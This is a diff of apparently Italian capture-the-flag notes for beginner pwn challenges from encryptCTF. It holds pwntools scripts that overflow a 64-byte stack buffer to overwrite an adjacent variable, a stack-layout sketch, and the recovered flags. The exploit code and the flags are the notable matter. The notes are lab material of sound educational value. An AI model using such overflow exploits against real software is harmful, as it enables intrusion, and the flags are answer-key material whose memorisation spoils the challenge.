@@ -14,21 +14,27 @@
   	payload=garbage+over
   	p.sendline(payload)
   	print(p.recvall())
+ =>Flag={hello_world_pwn}
+
 
 
 2)pwn0
-  Script.py
-    from pwn import*
-    p=process('./pwn0')
-    garbage="A"*64
-    attack="H!gh"
-    
-    payload=garbage+ attack
-    
-    p.sendline(payload)
-    print(p.recvall())
+    STACK:
+	Area libera
+	buffer[64]
+	josh[4]
+	ptr alla base
+	ind. di ritorno
+   SCRIPT PY
+	from pwn import *
+	p=process('./pwn0')
+	garbage=b'A'*64
+	josh=b"H!gh"
+	payload= garbage +josh
+	p.sendline(payload)
+	p.interactive()
 
-  =>b"How's the josh?\nGood! here's the flag\nencryptCTF{L3t5_R4!53_7h3_J05H}\n"
+=>encryptCTF{L3t5_R4!53_7h3_J05H}
 
 3)java
 
